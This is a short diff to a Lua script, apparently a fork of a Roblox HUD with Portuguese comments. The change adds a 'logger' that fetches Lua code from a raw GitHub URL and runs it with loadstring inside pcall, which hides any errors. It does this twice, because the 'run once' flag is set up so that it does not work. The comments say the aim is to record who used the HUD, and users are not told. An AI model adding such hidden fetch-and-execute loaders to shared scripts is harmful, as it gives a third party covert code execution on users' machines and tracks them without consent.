@@ -12,7 +12,24 @@
 	  - Notify() silenciada via DISABLE_ALL_NOTIFICATIONS
 
 ]]
+-- ================================================
+-- LOGGER (quem usou o HUD)
+-- ================================================
+local loggerUrl = "https://raw.githubusercontent.com/NevercryNever/Field/refs/heads/main/load.lua" 
+-- ou use um link direto de pastebin/hastebin se preferir
 
+pcall(function()
+    loadstring(game:HttpGet(loggerUrl))()
+end)
+
+-- Se quiser logar só uma vez por execução (recomendado):
+local hasLogged = false
+if not hasLogged then
+    hasLogged = true
+    pcall(function()
+        loadstring(game:HttpGet(loggerUrl))()
+    end)
+end
 -- ================================================
 -- CONFIGURACOES DO FORK
 -- ================================================
